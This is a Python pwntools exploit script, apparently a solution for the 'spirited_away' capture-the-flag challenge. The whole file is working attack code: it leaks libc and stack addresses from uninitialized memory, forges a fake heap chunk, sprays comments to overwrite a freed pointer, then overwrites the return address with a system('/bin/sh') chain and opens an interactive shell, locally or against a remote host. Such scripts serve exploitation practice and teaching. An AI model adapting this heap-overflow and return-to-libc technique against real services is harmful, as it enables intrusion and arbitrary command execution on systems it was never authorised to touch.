#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import ctypes

exe = context.binary = ELF('spirited_away_patched')
libc = exe.libc
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def send_comment(name, age, reason, comment):
    io.sendlineafter(b'name: ', name)
    io.sendlineafter(b'age: ', age) 
    io.sendlineafter(b'movie? ', reason)
    io.sendlineafter(b'comment: ', comment)

def write_payload(stack):
    io.sendafter(b'name: ', b"A")
    io.sendlineafter(b'age: ', b"1") 
    io.sendafter(b'movie? ', b"A")
    io.sendafter(b'comment: ', b"B"*(4*20) + p32(0x41) + p32(stack))
    redo()

def redo():
    io.sendlineafter(b'<y/n>:', b'Y')

def do_not_redo():
    io.sendlineafter(b'<y/n>:', b'N')

def spray():
    for _ in range(90):
        io.sendlineafter(b'age: ', b"1")
        io.sendafter(b'movie? ', b"A")
        redo()

def solve():

    """
    Get leaks from uninitialized memory
    """

    send_comment(b"A"*8, b"-", b"B"*(4 * 14), b"a")
    io.recvuntil(b"Age: ")
    leak1 = int(io.recvline())
    io.recvuntil(b"B"*(4 * 14))
    stack = u32(io.recv(4)) - 0x5a

    stdout = ctypes.c_uint32(leak1).value 
    libc.address = stdout - libc.sym['_IO_2_1_stdout_']
    log.info(f"Libc base: {hex(libc.address)}")
    log.info(f"Stack: {hex(stack)}")
    
    redo()

    """
    Setup future fake chunk in the reason buffer
    """

    send_comment(b"A", b"-1", b"B"*4 + p32(0x41) + b"\x00" * (4 * 15) + p32(0x41), b"a")
    redo()

    for _ in range(8):
        send_comment(b"A", b"-1", b"B", b"a")
        redo()

    spray()
    write_payload(stack)

    try:
        """
        Overwrite return address with ropchain
        """

        offset = 76
        payload = flat({
            offset: [
                libc.sym["system"],
                0x0,
                next(libc.search(b"/bin/sh\x00"))
            ]
        })
        send_comment(payload, b"1337", b"B", b"a")
        do_not_redo()

        io.interactive()
    except Exception as e:
        log.error(f"Exploit failed: Retrying...")
        io.close()

def main():
    
    while True:
        init()
        solve()
    

if __name__ == '__main__':
    main()

